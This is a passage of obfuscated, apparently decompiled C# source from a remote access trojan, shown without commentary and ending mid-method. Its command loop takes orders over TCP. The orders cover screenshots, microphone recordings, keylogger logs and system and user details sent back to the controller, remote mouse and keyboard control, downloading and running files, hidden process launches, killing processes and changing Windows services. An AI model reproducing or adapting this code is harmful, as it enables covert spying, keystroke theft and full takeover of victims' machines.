						object obj4 = NewLateBinding.LateGet((object)uTF, (Type)null, "GetBytes", array3, (string[])null, (Type[])null, array4);
						if (array4[0])
						{
							objectValue2 = RuntimeHelpers.GetObjectValue(array3[0]);
						}
						text2 = Convert.ToBase64String((byte[])obj4);
					}
					text = ((Operators.CompareString(text, (string)null, false) != 0) ? Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)(text + "¥"), obj3), (object)"§"), (object)text2)) : Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(obj3, (object)"§"), (object)text2)));
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
			}
			if (Operators.CompareString(text, (string)null, false) != 0)
			{
				ZHanOQKSlcRbYla7M150.WriteLine("/REGVIEWV/" + text);
				ZHanOQKSlcRbYla7M150.Flush();
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void oZtk5tk62dQYnj7QxbnmcpO171(object Tempdata)
	{
		try
		{
			Thread thread = new Thread(muaO5DW195);
			thread.Start(RuntimeHelpers.GetObjectValue(Tempdata));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void aYokbozAGudlYyktLQYVWzb172(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			switch (array[1])
			{
			case "STOP":
			{
				wRYAMOpFAlmmqzO8rpbTC48 wRYAMOpFAlmmqzO8rpbTC5 = new wRYAMOpFAlmmqzO8rpbTC48(array[0]);
				((ServiceController)wRYAMOpFAlmmqzO8rpbTC5).Stop();
				break;
			}
			case "START":
			{
				wRYAMOpFAlmmqzO8rpbTC48 wRYAMOpFAlmmqzO8rpbTC4 = new wRYAMOpFAlmmqzO8rpbTC48(array[0]);
				((ServiceController)wRYAMOpFAlmmqzO8rpbTC4).Start();
				break;
			}
			case "DISABLE":
			{
				wRYAMOpFAlmmqzO8rpbTC48 wRYAMOpFAlmmqzO8rpbTC3 = new wRYAMOpFAlmmqzO8rpbTC48(array[0]);
				wRYAMOpFAlmmqzO8rpbTC3.StartupType = "Disabled";
				break;
			}
			case "MANUAL":
			{
				wRYAMOpFAlmmqzO8rpbTC48 wRYAMOpFAlmmqzO8rpbTC2 = new wRYAMOpFAlmmqzO8rpbTC48(array[0]);
				wRYAMOpFAlmmqzO8rpbTC2.StartupType = "Manual";
				break;
			}
			case "AUTO":
			{
				wRYAMOpFAlmmqzO8rpbTC48 wRYAMOpFAlmmqzO8rpbTC = new wRYAMOpFAlmmqzO8rpbTC48(array[0]);
				wRYAMOpFAlmmqzO8rpbTC.StartupType = "Auto";
				break;
			}
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_10()
	{
		checked
		{
			try
			{
				if (AkKdTtuI7vVOBVpNSa37 != h5DXTcXW0wv2YYxrzG43)
				{
					StringBuilder stringBuilder = new StringBuilder();
					StringBuilder stringBuilder2 = new StringBuilder();
					AkKdTtuI7vVOBVpNSa37++;
					B5GMzKsx2FX3bYcoEN38 = new byte[wXtqfyQOe8N35 - 1 + 1];
					binaryReader_0.Read(B5GMzKsx2FX3bYcoEN38, 0, wXtqfyQOe8N35);
					c4abIxZL2pIjoOHiqk45 = binaryReader_0.BaseStream.Seek(0L, SeekOrigin.Current);
					stringBuilder.Append("/PAKSSEND/");
					int num = B5GMzKsx2FX3bYcoEN38.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						stringBuilder2.Append(B5GMzKsx2FX3bYcoEN38.GetValue(i)!.ToString() + " ");
					}
					stringBuilder.Append((object?)stringBuilder2);
					J580cztlCh0prHvvQRNdyH80.WriteLine((object?)stringBuilder);
					J580cztlCh0prHvvQRNdyH80.Flush();
				}
				else if (lrdglDlpgrdxgNwGmA44 > 0L)
				{
					StringBuilder stringBuilder3 = new StringBuilder();
					StringBuilder stringBuilder4 = new StringBuilder();
					B5GMzKsx2FX3bYcoEN38 = new byte[(int)(lrdglDlpgrdxgNwGmA44 - 1L) + 1];
					binaryReader_0.Read(B5GMzKsx2FX3bYcoEN38, 0, (int)lrdglDlpgrdxgNwGmA44);
					stringBuilder3.Append("/FINEDOWN/");
					int num2 = B5GMzKsx2FX3bYcoEN38.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						stringBuilder4.Append(B5GMzKsx2FX3bYcoEN38.GetValue(j)!.ToString() + " ");
					}
					stringBuilder3.Append((object?)stringBuilder4);
					J580cztlCh0prHvvQRNdyH80.WriteLine((object?)stringBuilder3);
					J580cztlCh0prHvvQRNdyH80.Flush();
					NSkqwkNbctHQ114();
				}
				else
				{
					J580cztlCh0prHvvQRNdyH80.WriteLine("/FINEDOWN/");
					J580cztlCh0prHvvQRNdyH80.Flush();
					NSkqwkNbctHQ114();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					NSkqwkNbctHQ114();
					J580cztlCh0prHvvQRNdyH80.WriteLine("/ERROR/");
					J580cztlCh0prHvvQRNdyH80.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void method_11(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
				string text = array.GetValue(1)!.ToString();
				string text2 = array.GetValue(0)!.ToString();
				if (!Directory.Exists(text2))
				{
					Directory.CreateDirectory(text2);
				}
				string[] array2 = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(array.GetValue(2), (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
				byte[] array3 = new byte[array2.GetUpperBound(0) + 1];
				int num = array2.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					array3[i] = Conversions.ToByte(array2.GetValue(i));
				}
				if (array2.Length < 32768)
				{
					string_1 = text2 + text;
					if (File.Exists(string_1))
					{
						method_6(1);
						try
						{
							File.Delete(string_1);
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							try
							{
								method_6(1);
								IOLZKlqOL4kXCdhBJJ40.Flush();
								IOLZKlqOL4kXCdhBJJ40.Close();
								binaryWriter_0.Close();
								File.Delete(string_1);
							}
							catch (Exception projectError2)
							{
								ProjectData.SetProjectError(projectError2);
								try
								{
									method_6(1);
								}
								catch (Exception projectError3)
								{
									ProjectData.SetProjectError(projectError3);
									File.Delete(string_1);
									ProjectData.ClearProjectError();
								}
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
					}
					IOLZKlqOL4kXCdhBJJ40 = new FileStream(string_1, FileMode.CreateNew);
					binaryWriter_0 = new BinaryWriter(IOLZKlqOL4kXCdhBJJ40);
					B5GMzKsx2FX3bYcoEN38 = new byte[array2.Length - 1 + 1];
					B5GMzKsx2FX3bYcoEN38 = array3;
					binaryWriter_0.Write(B5GMzKsx2FX3bYcoEN38);
					IOLZKlqOL4kXCdhBJJ40.Flush();
					IOLZKlqOL4kXCdhBJJ40.Close();
					binaryWriter_0.Close();
					return;
				}
				string_1 = text2 + text;
				if (File.Exists(string_1))
				{
					method_6(1);
					try
					{
						File.Delete(string_1);
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						try
						{
							method_6(1);
							IOLZKlqOL4kXCdhBJJ40.Flush();
							IOLZKlqOL4kXCdhBJJ40.Close();
							binaryWriter_0.Close();
							File.Delete(string_1);
						}
						catch (Exception projectError5)
						{
							ProjectData.SetProjectError(projectError5);
							try
							{
								method_6(1);
							}
							catch (Exception projectError6)
							{
								ProjectData.SetProjectError(projectError6);
								File.Delete(string_1);
								ProjectData.ClearProjectError();
							}
							ProjectData.ClearProjectError();
						}
						ProjectData.ClearProjectError();
					}
				}
				IOLZKlqOL4kXCdhBJJ40 = new FileStream(string_1, FileMode.CreateNew);
				binaryWriter_0 = new BinaryWriter(IOLZKlqOL4kXCdhBJJ40);
				B5GMzKsx2FX3bYcoEN38 = new byte[array2.Length - 1 + 1];
				B5GMzKsx2FX3bYcoEN38 = array3;
				binaryWriter_0.Write(B5GMzKsx2FX3bYcoEN38);
				IOLZKlqOL4kXCdhBJJ40.Flush();
				J580cztlCh0prHvvQRNdyH80.WriteLine("/ANOTHEPK/");
				J580cztlCh0prHvvQRNdyH80.Flush();
			}
			catch (Exception projectError7)
			{
				ProjectData.SetProjectError(projectError7);
				try
				{
					IOLZKlqOL4kXCdhBJJ40.Flush();
					IOLZKlqOL4kXCdhBJJ40.Close();
					binaryWriter_0.Close();
					J580cztlCh0prHvvQRNdyH80.WriteLine("/ERRORUPL/");
					J580cztlCh0prHvvQRNdyH80.Flush();
				}
				catch (Exception projectError8)
				{
					ProjectData.SetProjectError(projectError8);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void NfVEypUtkL175(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(Tempdata, (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
				byte[] array2 = new byte[array.GetUpperBound(0) + 1];
				int num = array.Length - 1;
				for (int i = 0; i <= num; i++)
				{
					array2[i] = Conversions.ToByte(array.GetValue(i));
				}
				B5GMzKsx2FX3bYcoEN38 = new byte[array.Length - 1 + 1];
				B5GMzKsx2FX3bYcoEN38 = array2;
				binaryWriter_0.Write(B5GMzKsx2FX3bYcoEN38);
				IOLZKlqOL4kXCdhBJJ40.Flush();
				J580cztlCh0prHvvQRNdyH80.WriteLine("/ANOTHEPK/");
				J580cztlCh0prHvvQRNdyH80.Flush();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					IOLZKlqOL4kXCdhBJJ40.Flush();
					IOLZKlqOL4kXCdhBJJ40.Close();
					binaryWriter_0.Close();
					J580cztlCh0prHvvQRNdyH80.WriteLine("/ERRORUPL/");
					J580cztlCh0prHvvQRNdyH80.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	private void mNgYMCHgsj176(object Tempdata)
	{
		checked
		{
			try
			{
				if (Operators.ConditionalCompareObjectNotEqual(Tempdata, (object)"", false))
				{
					string[] array = (string[])NewLateBinding.LateGet(NewLateBinding.LateGet(Tempdata, (Type)null, "Trim", new object[0], (string[])null, (Type[])null, (bool[])null), (Type)null, "Split", new object[1] { " " }, (string[])null, (Type[])null, (bool[])null);
					byte[] array2 = new byte[array.GetUpperBound(0) + 1];
					int num = array.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						array2[i] = Conversions.ToByte(array.GetValue(i));
					}
					B5GMzKsx2FX3bYcoEN38 = new byte[array.Length - 1 + 1];
					B5GMzKsx2FX3bYcoEN38 = array2;
					binaryWriter_0.Write(B5GMzKsx2FX3bYcoEN38);
					IOLZKlqOL4kXCdhBJJ40.Flush();
					IOLZKlqOL4kXCdhBJJ40.Close();
					binaryWriter_0.Close();
				}
				else
				{
					IOLZKlqOL4kXCdhBJJ40.Flush();
					IOLZKlqOL4kXCdhBJJ40.Close();
					binaryWriter_0.Close();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					IOLZKlqOL4kXCdhBJJ40.Flush();
					IOLZKlqOL4kXCdhBJJ40.Close();
					binaryWriter_0.Close();
					J580cztlCh0prHvvQRNdyH80.WriteLine("/ERRORUPL/");
					J580cztlCh0prHvvQRNdyH80.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
	}

	[DllImport("user32.dll", CharSet = CharSet.Auto)]
	public static extern IntPtr GetMessageExtraInfo();

	private void dvjIyqcv93178(object Tempdata)
	{
		try
		{
			if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"right", false))
			{
				mouse_event(8, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(16, 0, 0, 0, (int)GetMessageExtraInfo());
			}
			else if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"left", false))
			{
				mouse_event(2, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(4, 0, 0, 0, (int)GetMessageExtraInfo());
			}
			else if (Operators.ConditionalCompareObjectEqual(Tempdata, (object)"middle", false))
			{
				mouse_event(32, 0, 0, 0, (int)GetMessageExtraInfo());
				mouse_event(64, 0, 0, 0, (int)GetMessageExtraInfo());
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void IH8oAk1fUZ179(object Tempdata)
	{
		checked
		{
			try
			{
				string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { '*' }, (string[])null, (Type[])null, (bool[])null);
				int x = (int)Math.Round(Math.Floor(double.Parse(array[0])));
				int y = (int)Math.Round(Math.Floor(double.Parse(array[1])));
				ref Point reference = ref fIuVf52;
				reference = new Point(x, y);
				Cursor.set_Position(fIuVf52);
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				ProjectData.ClearProjectError();
			}
		}
	}

	private void OX1xb5hufY180()
	{
		try
		{
			if (ZVD1k4AHEbwDuQ12)
			{
				string lpstrCommand = "open new type waveaudio alias capture";
				string lpstrReturnString = null;
				mciSendStringA(ref lpstrCommand, ref lpstrReturnString, 0, 0);
				lpstrReturnString = "set capture samplespersec 6000 channels 8 bitspersample 1 alignment 1 bytespersec 6000";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				lpstrReturnString = "record capture";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				method_6(5);
				lpstrReturnString = "save capture test.wav";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				lpstrReturnString = "close capture";
				lpstrCommand = null;
				mciSendStringA(ref lpstrReturnString, ref lpstrCommand, 0, 0);
				try
				{
					ETktHEpgZ7Zsm1rVyVI3Bn70.WriteLine("/SOUNDREC/" + Convert.ToBase64String(((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().ReadAllBytes("test.wav")));
					ETktHEpgZ7Zsm1rVyVI3Bn70.Flush();
				}
				catch (Exception projectError)
				{
					ProjectData.SetProjectError(projectError);
					ProjectData.ClearProjectError();
				}
				((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().DeleteFile(Application.get_StartupPath() + "\\test.wav");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
	}

	private void tWSGyRuxpm181(object Tempdata)
	{
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "*" }, (string[])null, (Type[])null, (bool[])null);
			string text = array.GetValue(1)!.ToString();
			if (!Directory.Exists(array.GetValue(0)!.ToString()))
			{
				Directory.CreateDirectory(array.GetValue(0)!.ToString());
			}
			if (!File.Exists(array.GetValue(0)!.ToString() + text))
			{
				string text2 = array.GetValue(2)!.ToString();
				((ServerComputer)RWfjxtEPH2.Computer).get_Network().DownloadFile(text2, array.GetValue(0)!.ToString() + text, (string)null, (string)null, false, 100000, true);
				method_6(5);
			}
			int num = 0;
			Process[] processes = Process.GetProcesses();
			foreach (Process process in processes)
			{
				if (process.ProcessName.StartsWith("winupdate"))
				{
					num = 1;
				}
			}
			if (num == 0)
			{
				Process.Start(array.GetValue(0)!.ToString() + text);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void qc6pBHyzR3182(object Tempdata)
	{
		try
		{
			SendKeys.SendWait(Conversions.ToString(Tempdata));
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void xG3APftLws183()
	{
		//IL_0006: Unknown result type (might be due to invalid IL or missing references)
		//IL_0010: Expected O, but got Unknown
		try
		{
			managementObjectSearcher_0 = new ManagementObjectSearcher("SELECT * FROM Win32_ComputerSystem");
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = managementObjectSearcher_0.Get().GetEnumerator();
				while (enumerator.MoveNext())
				{
					object current = enumerator.get_Current();
					qccXF58 = NewLateBinding.LateIndexGet(current, new object[1] { "manufacturer" }, (string[])null).ToString();
					OnONf59 = NewLateBinding.LateIndexGet(current, new object[1] { "model" }, (string[])null).ToString();
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			string text = null;
			text = "/INFOPCPC/";
			text = text + "Computer Name = " + ((ServerComputer)RWfjxtEPH2.Computer).get_Name() + "±";
			text = text + "Computer Manufacturer = " + Manufacturer + "±";
			text = text + "Computer Model = " + Model + "±";
			text = text + "OS Name = " + ((ServerComputer)RWfjxtEPH2.Computer).get_Info().get_OSFullName() + "±";
			text = text + "OS Version = " + ((ServerComputer)RWfjxtEPH2.Computer).get_Info().get_OSVersion() + "±";
			text = text + "System Type = " + ((ServerComputer)RWfjxtEPH2.Computer).get_Info().get_OSPlatform() + "±";
			text = text + "Total Physical Memory = " + Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_Info().get_TotalPhysicalMemory()) + "±";
			text = text + "Total Virtual Memory = " + Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_Info().get_TotalVirtualMemory()) + "±";
			text = text + "Available Physical Memory = " + Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_Info().get_AvailablePhysicalMemory()) + "±";
			text = text + "Available Virtual Memory = " + Conversions.ToString(((ServerComputer)RWfjxtEPH2.Computer).get_Info().get_AvailableVirtualMemory()) + "±";
			text = text + "Username = " + RWfjxtEPH2.User.get_Name() + "±";
			text = text + "System Directory = " + Environment.SystemDirectory;
			SnN5zNIYZ85.WriteLine(text);
			SnN5zNIYZ85.Flush();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_12(object t)
	{
		try
		{
			if (Conversions.ToBoolean(t))
			{
				((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().WriteAllText(Path.GetTempPath() + "logdll.txt", "", false);
				return;
			}
			string text = ((ServerComputer)RWfjxtEPH2.Computer).get_FileSystem().ReadAllText(Path.GetTempPath() + "logdll.txt");
			if (text.Length > 2000000)
			{
				text = A4MHFmQw3DUU112("Log file too big", "&%#@?,:*");
				pOC5vQ675U05Y125.WriteLine("/KEYSLOGG/" + text);
				pOC5vQ675U05Y125.Flush();
			}
			else
			{
				text = A4MHFmQw3DUU112(text, "&%#@?,:*");
				pOC5vQ675U05Y125.WriteLine("/KEYSLOGG/" + text);
				pOC5vQ675U05Y125.Flush();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void QtQyzCRCWu185(object t)
	{
		try
		{
			if (Conversions.ToBoolean(t))
			{
				string lpstrCommand = "Set CDaudio door open";
				mciExecute(ref lpstrCommand);
			}
			else
			{
				string lpstrCommand = "Set CDaudio door closed";
				mciExecute(ref lpstrCommand);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void xHCcqMThQi186(object Tempdata)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = Conversions.ToString(Tempdata);
			process.StartInfo.WindowStyle = ProcessWindowStyle.Hidden;
			process.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void oJ1WcHWVPP187(object Tempdata)
	{
		try
		{
			Process process = new Process();
			process.StartInfo.FileName = Conversions.ToString(Tempdata);
			process.StartInfo.WindowStyle = ProcessWindowStyle.Normal;
			process.Start();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void T6I8d4Qu1d188(object Tempdata)
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_004f: Expected O, but got Unknown
		//IL_0085: Unknown result type (might be due to invalid IL or missing references)
		//IL_008b: Expected O, but got Unknown
		//IL_010c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0113: Expected O, but got Unknown
		try
		{
			string[] array = (string[])NewLateBinding.LateGet(Tempdata, (Type)null, "Split", new object[1] { "¦" }, (string[])null, (Type[])null, (bool[])null);
			string text = null;
			EncoderParameters val = new EncoderParameters(1);
			val.get_Param()[0] = new EncoderParameter(Encoder.Quality, (long)int.Parse(array[0]));
			ImageCodecInfo val2 = BckQMcCJXq3vz1L106("image/jpeg");
			int num = int.Parse(array[1]);
			int num2 = 0;
			Bitmap val3 = new Bitmap(rectangle_0.Width, rectangle_0.Height, (PixelFormat)135173);
			if (rectangle_0.Width < num)
			{
				num = rectangle_0.Width;
			}
			switch (num)
			{
			case 1280:
				num2 = 1024;
				break;
			case 1024:
				num2 = 768;
				break;
			case 800:
				num2 = 600;
				break;
			case 640:
				num2 = 480;
				break;
			case 320:
				num2 = 240;
				break;
			}
			Bitmap val4 = new Bitmap(num, num2, (PixelFormat)135173);
			Graphics val5 = Graphics.FromImage((Image)(object)val3);
			val5.CopyFromScreen(rectangle_0.X, rectangle_0.Y, 0, 0, rectangle_0.Size, (CopyPixelOperation)13369376);
			val5 = Graphics.FromImage((Image)(object)val4);
			val5.set_InterpolationMode((InterpolationMode)7);
			val5.set_CompositingQuality((CompositingQuality)2);
			val5.DrawImage((Image)(object)val3, 0, 0, num, num2);
			MemoryStream memoryStream = new MemoryStream();
			if (Conversions.ToDouble(array[0]) > 75.0)
			{
				((Image)val4).Save((Stream)memoryStream, ImageFormat.get_Jpeg());
			}
			else
			{
				((Image)val4).Save((Stream)memoryStream, val2, val);
			}
			memoryStream.Capacity = checked((int)memoryStream.Length);
			byte[] buffer = memoryStream.GetBuffer();
			text = Convert.ToBase64String(buffer);
			_ = text.Length;
			((Image)val3).Dispose();
			((Image)val4).Dispose();
			memoryStream.Dispose();
			memoryStream.Close();
			val5.Dispose();
			buffer = null;
			ETktHEpgZ7Zsm1rVyVI3Bn70.WriteLine("/STARDESK/" + text);
			ETktHEpgZ7Zsm1rVyVI3Bn70.Flush();
			text = null;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void oQP1Vs53KM189(object Tempdata)
	{
		try
		{
			int processId = int.Parse(Conversions.ToString(Tempdata));
			Process processById = Process.GetProcessById(processId);
			try
			{
				if (processById != null)
				{
					processById.Kill();
					GP04RkhRarmzrCZrgohc135.WriteLine("/REFRESHP/");
					GP04RkhRarmzrCZrgohc135.Flush();
				}
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				try
				{
					Process.EnterDebugMode();
					processById.Kill();
					Process.LeaveDebugMode();
					GP04RkhRarmzrCZrgohc135.WriteLine("/REFRESHP/");
					GP04RkhRarmzrCZrgohc135.Flush();
				}
				catch (Exception projectError2)
				{
					ProjectData.SetProjectError(projectError2);
					ProjectData.ClearProjectError();
				}
				ProjectData.ClearProjectError();
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void SwByk7r190(object Tempdata)
	{
		try
		{
			object objectValue = RuntimeHelpers.GetObjectValue(Interaction.CreateObject("SAPI.SpVoice", ""));
			object[] array = new object[1] { RuntimeHelpers.GetObjectValue(Tempdata) };
			bool[] array2 = new bool[1] { true };
			NewLateBinding.LateCall(objectValue, (Type)null, "Speak", array, (string[])null, (Type[])null, array2, true);
			if (array2[0])
			{
				Tempdata = RuntimeHelpers.GetObjectValue(array[0]);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public bool TlRFVN6191(string addrrr)
	{
		bool flag = false;
		try
		{
			string pattern = "^([1-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])(\\.([0-9]|[1-9][0-9]|1[0-9][0-9]|2[0-4][0-9]|25[0-5])){3}$";
			Regex regex = new Regex(pattern);
			flag = Operators.CompareString(addrrr, "", false) != 0 && regex.IsMatch(addrrr, 0);
			return flag;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			bool result = flag;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void BqYtZmW192()
	{
		string text = null;
		try
		{
			while (tcpClient_0.Connected)
			{
				text = FAV6plO6xUZud703B7Vpsi71.ReadLine();
				if (Operators.CompareString(text, (string)null, false) == 0)
				{
					method_6(1);
				}
				switch (Strings.Left(text, 10))
				{
				case "/DOWNDESK/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread7 = new Thread(T6I8d4Qu1d188);
						thread7.Start(text);
					}
					catch (Exception projectError11)
					{
						ProjectData.SetProjectError(projectError11);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSQL/":
					try
					{
						ETktHEpgZ7Zsm1rVyVI3Bn70.WriteLine("/STARTSQL/" + Conversions.ToString(Screen.get_PrimaryScreen().get_Bounds().Width) + "*" + Conversions.ToString(Screen.get_PrimaryScreen().get_Bounds().Height));
						ETktHEpgZ7Zsm1rVyVI3Bn70.Flush();
					}
					catch (Exception projectError10)
					{
						ProjectData.SetProjectError(projectError10);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SENDKEYB/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread6 = new Thread(qc6pBHyzR3182);
						thread6.Start(text);
					}
					catch (Exception projectError9)
					{
						ProjectData.SetProjectError(projectError9);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SETMOUSE/":
				{
					text = Strings.Mid(text, 11, Strings.Len(text));
					Thread thread5 = new Thread(IH8oAk1fUZ179);
					thread5.Start(text);
					break;
				}
				case "/SETCLICK/":
				{
					text = Strings.Mid(text, 11, Strings.Len(text));
					Thread thread4 = new Thread(dvjIyqcv93178);
					thread4.Start(text);
					break;
				}
				case "/STARTSQN/":
					try
					{
						JoqCFjt3QDGVdW14 = true;
						ETktHEpgZ7Zsm1rVyVI3Bn70.WriteLine("/STARTSQN/");
						ETktHEpgZ7Zsm1rVyVI3Bn70.Flush();
					}
					catch (Exception projectError8)
					{
						ProjectData.SetProjectError(projectError8);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSEQ/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread3 = new Thread(uBLzQOJs9uiNAxMY152);
						thread3.Start(text);
					}
					catch (Exception projectError7)
					{
						ProjectData.SetProjectError(projectError7);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STARTSEF/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						Thread thread2 = new Thread(guo87eVbFAVp1tQA153);
						thread2.Start(text);
					}
					catch (Exception projectError6)
					{
						ProjectData.SetProjectError(projectError6);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPPSEQ/":
					try
					{
						JoqCFjt3QDGVdW14 = false;
					}
					catch (Exception projectError5)
					{
						ProjectData.SetProjectError(projectError5);
						ProjectData.ClearProjectError();
					}
					break;
				case "/STOPDESK/":
					try
					{
						JoqCFjt3QDGVdW14 = false;
						ETktHEpgZ7Zsm1rVyVI3Bn70.Dispose();
						FAV6plO6xUZud703B7Vpsi71.Dispose();
						networkStream_0.Dispose();
						tcpClient_0.Close();
						return;
					}
					catch (Exception projectError4)
					{
						ProjectData.SetProjectError(projectError4);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SOUNDREC/":
					try
					{
						text = Strings.Mid(text, 11, Strings.Len(text));
						ZVD1k4AHEbwDuQ12 = true;
						Thread thread = new Thread(OX1xb5hufY180);
						thread.Start();
					}
					catch (Exception projectError3)
					{
						ProjectData.SetProjectError(projectError3);
						ProjectData.ClearProjectError();
					}
					break;
				case "/SOUNDSTP/":
					try
					{
						ZVD1k4AHEbwDuQ12 = false;
					}
					catch (Exception projectError2)
					{
						ProjectData.SetProjectError(projectError2);
						ProjectData.ClearProjectError();
					}
					break;
				default:
					try
					{
						ETktHEpgZ7Zsm1rVyVI3Bn70.WriteLine("/STARDESK/");
						ETktHEpgZ7Zsm1rVyVI3Bn70.Flush();
					}
					catch (Exception projectError)
					{
						ProjectData.SetProjectError(projectError);
						ProjectData.ClearProjectError();
					}
					break;
				}
			}
		}
		catch (Exception projectError12)
		{
			ProjectData.SetProjectError(projectError12);
			ProjectData.ClearProjectError();
		}
	}

	private void ogCUyT0193()
	{
		string text = null;
		checked
		{
			try
			{
				while (sROjUukB8bUmSEi6Iclqdo73.Connected)
				{
					text = EfPlBou5E7VJA3nBHJvI2y76.ReadLine();
					if (Operators.CompareString(text, (string)null, false) == 0)
					{
						method_6(1);
					}
					switch (Strings.Left(text, 10))
					{
					case "/WEBLISTC/":
						try
						{
